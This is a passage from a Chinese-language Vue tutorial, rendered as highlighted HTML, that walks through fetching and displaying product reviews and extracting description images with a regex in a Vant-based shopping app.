style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="msg text-ellipsis-2"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        {{ goodsObj.goods_name }}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>到这里还没有完成评论区的动态渲染</p><h3 id="商品评论区渲染"><a class="markdownIt-Anchor" href="#商品评论区渲染"></a> 商品评论区渲染</h3><p>封装请求获取商品评价详情的模块 <code>api/goodsDetail.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 获取商品评价详情</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsCommentDetail</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">scoreType</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">page</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/comment/list"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">params:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">scoreType</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>请求解构：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408301611303.png" alt="image-20240830161142137"></p><p>完成商品评价渲染（默认只展示三条评价）</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">&lt;!-- 商品评价 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="comment-title"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="left"&gt;商品评价 ({{ goodsCommentArray.length }}条)</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">`/productComment?id=</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">detailId</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">查看更多 &lt;van-icon name="arrow" /&gt; </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="comment-list"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="comment-item" v-for="(item, index) in goodsCommentArray" :key="item.comment_id"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;div class="top" v-if="index &lt; 3"&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;img :src="item.user.avatar_url ? item.user.avatar_url : defaultAvatar" alt=""&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;div class="name"&gt;{{item.user.nick_name}}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-rate</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">16</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">score</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#ffd21e"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">void-icon</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"star"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">void-color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#eee"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;div class="content" v-if="index &lt; 3"&gt;</span></span><span class="line"><span style="color: #D4D4D4">            {{item.content}}</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"time"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4"> &lt; </span><span style="color: #B5CEA8">3</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            {{item.create_time}}</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>在生命周期钩子 created 中：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品详情-说明部分</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detailId</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsDetail</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(res)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsDetailObj</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">images</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsDetailObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_images</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品详情-评价部分</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">commentRes</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsCommentDetail</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">scoreType:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 默认抓取好评</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsId:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">page:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span></span><span class="line"><span style="color: #D4D4D4">    })</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsCommentArray</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">commentRes</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span></code></pre></div></div></figure><p>data 提供：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">defaultAvatar:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'https://.../coding/202408301648039.png'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsDetailObj:</span><span style="color: #D4D4D4"> {}, </span><span style="color: #6A9955">// 商品说明</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsCommentArray:</span><span style="color: #D4D4D4"> {}, </span><span style="color: #6A9955">// 商品评价</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">images:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">current:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span></code></pre></div></div></figure><p>现在剩下商品说明的图片未渲染、商品评论区未渲染</p><h3 id="商品说明的图片渲染"><a class="markdownIt-Anchor" href="#商品说明的图片渲染"></a> 商品说明的图片渲染</h3><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310104868.png" alt="image-20240830174412273"><br>接口返回的数据中 content 就是商品详细说明的图：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310105026.png" alt="image-20240830174505655"></p><p>于是再于 data 中提供两个数据用于处理：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">imgSrcRegex</span><span style="color: #D4D4D4">:</span><span style="color: #D16969"> /&lt;img</span><span style="color: #CE9178">[^</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">]</span><span style="color: #D7BA7D">+</span><span style="color: #D16969">src="</span><span style="color: #CE9178">([^</span><span style="color: #D16969">"&gt;</span><span style="color: #CE9178">]</span><span style="color: #D7BA7D">+</span><span style="color: #CE9178">)</span><span style="color: #D16969">"/</span><span style="color: #569CD6">g</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 匹配接口数据html中的src图</span></span><span class="line"><span style="color: #C8C8C8">imgSrcArray</span><span style="color: #D4D4D4">: [], </span><span style="color: #6A9955">// 商品详细介绍长图</span></span></code></pre></div></div></figure><p>再到 created 中编写：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品详情-说明部分</span></span><span class="line"><span style="color: #D4D4D4">    ...</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品详情-评价部分</span></span><span class="line"><span style="color: #D4D4D4">   ...</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 正则匹配得到商品详细介绍长图</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">htmlString</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsDetailObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">srcArray</span><span style="color: #D4D4D4"> = []</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">regex</span><span style="color: #D4D4D4"> =</span><span style="color: #D16969"> /&lt;img\s</span><span style="color: #D7BA7D">+</span><span style="color: #CE9178">[^</span><span style="color: #D16969">&gt;</span><span style="color: #CE9178">]</span><span style="color: #D7BA7D">*</span><span style="color: #D16969">src="</span><span style="color: #CE9178">([^</span><span style="color: #D16969">"</span><span style="color: #CE9178">]</span><span style="color: #D7BA7D">*</span><span style="color: #CE9178">)</span><span style="color: #D16969">"/</span><span style="color: #569CD6">g</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">match</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">while</span><span style="color: #D4D4D4"> ((</span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">regex</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">exec</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">htmlString</span><span style="color: #D4D4D4">)) !== </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">srcArray</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">]) </span><span style="color: #6A9955">// 将匹配到的 src URL 添加到数组中</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">imgSrcArray</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">srcArray</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(this.imgSrcArray) // 输出结果数组</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span></code></pre></div></div></figure><p>接下来就剩下完全的评价区渲染了。</p><h2 id="商品评价区"><a class="markdownIt-Anchor" href="#商品评价区"></a> 商品评价区</h2><p>这是一个新的页面所以直接新建了。<code>views/productdetail/evaluation.vue</code></p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goodsEvaluation"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"商品评价页"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"comment-item"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">goodsCommentArray</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">comment_id</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"top"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">user</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">avatar_url</span><span style="color: #D4D4D4"> || </span><span style="color: #9CDCFE">defaultAvatar</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"name"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">{{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">user</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">nick_name</span><span style="color: #D4D4D4"> }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-rate</span></span><span class="line"><span style="color: #D4D4D4">            :</span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">16</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">score</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#ffd21e"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">void-icon</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"star"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">void-color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"#eee"</span></span><span class="line"><span style="color: #D4D4D4">          /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"content"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"time"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">create_time</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: 